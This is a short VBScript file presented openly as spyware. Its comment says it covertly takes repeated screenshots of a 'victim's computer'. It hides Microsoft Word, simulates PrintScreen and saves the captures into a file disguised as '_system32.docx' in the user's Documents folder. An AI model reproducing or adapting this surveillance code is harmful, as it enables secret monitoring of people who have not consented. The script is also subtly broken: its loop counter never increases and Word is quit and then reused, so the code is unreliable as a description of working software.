' Captures 8 screenshots of the victim's computer, 1 screenshot is take after every 7 seconds

On Error Resume Next

Dim obj_MSW
Dim obj_MSWB
Dim obj_WSH
Dim obj_FSO
Dim Doc
Dim PATH
Dim x

Set obj_MSW = CreateObject("Word.Application")
Set obj_MSWB = CreateObject("Word.Basic")
Set obj_WSH = CreateObject("Wscript.Shell")
Set obj_FSO = CreateObject("Scripting.FileSystemObject")



PATH = obj_WSH.ExpandEnvironmentStrings("%userprofile%\Documents\") & "_system32.docx"

If not obj_FSO.FileExists(PATH)=True Then
   Doc = obj_FSO.CreateTextFile(PATH)

End If
Doc.Close

obj_MSW.Visible = False

count = 0
While count < 8
	Wscript.Sleep(7000)
	obj_MSWB.SendKeys("{PrtSc}")

	With obj_MSW.Documents.Open(PATH)
		obj_MSW.Selection.Paste
		.Save
	End With
	
	obj_MSW.Quit
Wend

